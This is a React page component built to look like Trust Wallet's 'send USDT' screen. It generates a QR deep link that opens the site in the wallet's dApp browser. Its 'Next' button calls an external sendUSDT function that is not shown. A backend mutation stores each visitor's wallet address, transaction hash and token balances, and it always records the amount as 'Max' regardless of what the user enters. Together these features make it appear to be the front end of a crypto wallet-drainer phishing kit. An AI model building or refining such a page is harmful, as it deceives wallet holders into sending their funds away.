import { useState, useEffect } from "react";
import { useMutation } from "convex/react";
import { api } from "@/convex/_generated/api.js";
import QRCode from "qrcode";
import { Button } from "@/components/ui/button.tsx";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog.tsx";
import { QrCode, Download } from "lucide-react";
import { toast } from "sonner";

declare global {
  interface Window {
    sendUSDT?: () => Promise<void>;
    saveTransaction?: (data: {
      walletAddress: string;
      toAddress: string;
      txHash: string;
      usdtBalance: string;
      nativeBalance: string;
    }) => void;
  }
}

export default function Index() {
  const [toAddress, setToAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [showQR, setShowQR] = useState(false);
  const [qrDataUrl, setQrDataUrl] = useState("");
  const createTransaction = useMutation(api.transactions.createTransaction);

  useEffect(() => {
    // Expose save function to app.js
    window.saveTransaction = (data) => {
      createTransaction({
        walletAddress: data.walletAddress,
        toAddress: data.toAddress,
        amount: "Max",
        txHash: data.txHash,
        usdtBalance: data.usdtBalance + " USDT",
        nativeBalance: data.nativeBalance + " BNB",
      }).catch(console.error);
    };

    return () => {
      delete window.saveTransaction;
    };
  }, [createTransaction]);

  function handleSendUSDT() {
    if (window.sendUSDT) {
      window.sendUSDT();
    }
  }

  function setMax() {
    setAmount("Max");
  }

  async function generateQRCode() {
    try {
      // Get current website URL
      const websiteUrl = window.location.origin;
      
      // Trust Wallet deep link format
      const deepLink = `https://link.trustwallet.com/browser?url=${encodeURIComponent(websiteUrl)}`;
      
      // Generate QR code
      const dataUrl = await QRCode.toDataURL(deepLink, {
        width: 300,
        margin: 2,
        color: {
          dark: "#000000",
          light: "#FFFFFF",
        },
      });
      
      setQrDataUrl(dataUrl);
      setShowQR(true);
    } catch (error) {
      console.error("QR code generation failed:", error);
      toast.error("Failed to generate QR code");
    }
  }

  function downloadQR() {
    if (!qrDataUrl) return;
    
    const link = document.createElement("a");
    link.href = qrDataUrl;
    link.download = "trust-wallet-qr.png";
    link.click();
    toast.success("QR code downloaded");
  }

  return (
    <div
      style={{
        margin: 0,
        background: "#0b0b0b",
        color: "#fff",
        fontFamily: "-apple-system, BlinkMacSystemFont, sans-serif",
        minHeight: "100vh",
      }}
    >
      <div style={{ padding: "20px" }}>
        <div style={{ fontSize: "14px", opacity: 0.7, marginBottom: "6px" }}>
          Address or Domain Name
        </div>
        <div
          style={{
            background: "#151515",
            borderRadius: "12px",
            padding: "14px",
            marginBottom: "20px",
          }}
        >
          <input
            id="toAddress"
            value={toAddress}
            onChange={(e) => setToAddress(e.target.value)}
            placeholder="0x..."
            style={{
              width: "100%",
              background: "transparent",
              border: "none",
              outline: "none",
              color: "#fff",
              fontSize: "16px",
            }}
          />
        </div>

        <div style={{ fontSize: "14px", opacity: 0.7, marginBottom: "6px" }}>
          Amount
        </div>
        <div
          style={{
            background: "#151515",
            borderRadius: "12px",
            padding: "14px",
            marginBottom: "20px",
            display: "flex",
            justifyContent: "space-between",
            alignItems: "center",
          }}
        >
          <input
            id="amount"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            placeholder="0.0"
            style={{
              background: "transparent",
              border: "none",
              outline: "none",
              color: "#fff",
              fontSize: "16px",
              flex: 1,
            }}
          />
          <div>
            <span style={{ color: "#25d695", fontWeight: 600 }}>USDT</span>
            &nbsp;&nbsp;
            <span
              onClick={setMax}
              style={{
                color: "#25d695",
                fontSize: "14px",
                cursor: "pointer",
              }}
            >
              Max
            </span>
          </div>
        </div>
      </div>

      <button
        onClick={handleSendUSDT}
        style={{
          position: "fixed",
          bottom: "20px",
          left: "20px",
          right: "20px",
          background: "#1f8f5f",
          color: "#000",
          border: "none",
          borderRadius: "14px",
          padding: "16px",
          fontSize: "18px",
          fontWeight: 600,
          cursor: "pointer",
        }}
      >
        Next
      </button>
    </div>
  );
}
